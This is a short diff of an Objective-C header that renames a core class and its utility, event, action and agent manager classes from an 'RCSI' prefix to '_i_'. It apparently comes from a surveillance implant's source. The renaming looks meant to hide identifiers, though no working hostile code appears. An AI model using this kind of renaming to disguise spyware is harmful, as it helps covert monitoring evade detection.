@@ -23,21 +23,21 @@ extern void checkAndRunDemoMode();
 #define CORE_STOPPING 2
 #define CORE_RUNNING  4
 
-@interface RCSICore : NSObject
+@interface _i_Core : NSObject
 {
 @private
   uint mMainLoopControlFlag; // @"START" | @"STOP" | @"RUNNING"
   uint32_t          moduleStatus;
-  RCSIUtils         *mUtil;
-  RCSIEventManager  *eventManager;
-  RCSIActionManager *actionManager;
-  RCSIAgentManager  *agentManager;
+  _i_Utils         *mUtil;
+  _i_EventManager  *eventManager;
+  _i_ActionManager *actionManager;
+  _i_AgentManager  *agentManager;
   int               mLockSock;
   pid_t             mSBPid;
 }
 
 @property (readwrite)       uint mMainLoopControlFlag;
-@property (readonly)        RCSIUtils *mUtil;
+@property (readonly)        _i_Utils *mUtil;
 @property (readwrite)       pid_t mSBPid;
 
 - (id)init;
